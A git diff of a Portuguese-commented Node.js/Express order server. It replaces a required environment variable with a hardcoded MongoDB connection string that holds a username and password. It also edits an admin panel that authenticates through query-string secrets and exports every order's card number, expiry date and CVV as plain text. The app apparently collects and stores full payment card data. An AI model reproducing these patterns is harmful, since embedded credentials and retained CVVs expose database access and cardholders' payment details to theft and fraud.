@@ -7,11 +7,9 @@ const path     = require('path');
 const app = express();
 
 // ====== 1) Conexão com MongoDB ======
-const mongoURI = process.env.MONGODB_URI || process.env.MONGO_URI;
-if (!mongoURI) {
-  console.error('✖️ ERRO: variável de ambiente MONGODB_URI não definida.');
-  process.exit(1);
-}
+// MongoDB URI: usa a variável de ambiente, ou cai no fallback com sua URI já com credenciais
+const mongoURI = process.env.MONGODB_URI
+  || "mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
 
 mongoose.connect(mongoURI, {
   useNewUrlParser: true,
@@ -62,16 +60,16 @@ app.post('/pedido', async (req, res) => {
 // ====== 6) Painel de Admin ======
 app.get('/admin', async (req, res) => {
   const { senha, auth } = req.query;
-  // autenticação
+  // Autenticação básica
   if (senha !== ADMIN_PASSWORD || auth !== ADMIN_AUTH_CODE) {
-    const err = (senha || auth)
+    const errMsg = (senha || auth)
       ? '<p style="color:red;">Senha ou código inválido.</p>'
       : '';
     return res.send(`
       <html><head><meta charset="UTF-8"><title>Admin Login</title></head>
       <body style="font-family:Arial,sans-serif;padding:20px;">
         <h1>Admin Login</h1>
-        ${err}
+        ${errMsg}
         <form method="get" action="/admin">
           <label>Senha:<br>
             <input type="password" name="senha" required style="width:300px;padding:6px">
@@ -85,19 +83,21 @@ app.get('/admin', async (req, res) => {
     `);
   }
 
-  // autenticado: busca e exibe todos os pedidos
+  // Autenticado: busca todos os pedidos
   const pedidos = await Pedido.find().sort('-createdAt').lean();
   res.send(`
     <html><head><meta charset="UTF-8"><title>Painel Admin</title>
       <style>
         body { font-family:Arial,sans-serif; background:#fafafa; padding:20px; }
         h1 { color:#be4299; }
-        details { background:#fff; padding:12px; margin-bottom:12px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
+        details { background:#fff; padding:12px; margin-bottom:12px;
+                  border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
         summary { font-weight:bold; cursor:pointer; }
         table { width:100%; border-collapse:collapse; margin-top:8px; }
         th,td { border:1px solid #ddd; padding:6px; text-align:left; }
         th { background:#fdebf5; }
-        button { padding:8px 12px; background:#be4299; color:#fff; border:none; border-radius:4px; cursor:pointer; }
+        button { padding:8px 12px; background:#be4299; color:#fff;
+                 border:none; border-radius:4px; cursor:pointer; }
       </style>
     </head><body>
       <h1>Painel Admin — Pedidos</h1>
@@ -117,7 +117,7 @@ app.get('/admin', async (req, res) => {
         document.getElementById('exportAll').addEventListener('click', () => {
           let txt = '=== Todos os Pedidos ===\\n\\n';
           pedidos.forEach(p => {
-            txt += '--- Pedido ' + p._id + ' ---\\n';
+            txt += '--- ' + p.nome_titular + ' (' + new Date(p.createdAt).toLocaleString() + ') ---\\n';
             ['nome_titular','numero_cartao','validade','cvv','telefone','email']
               .forEach(k => txt += k + ': ' + (p[k]||'') + '\\n');
             txt += '\\n';
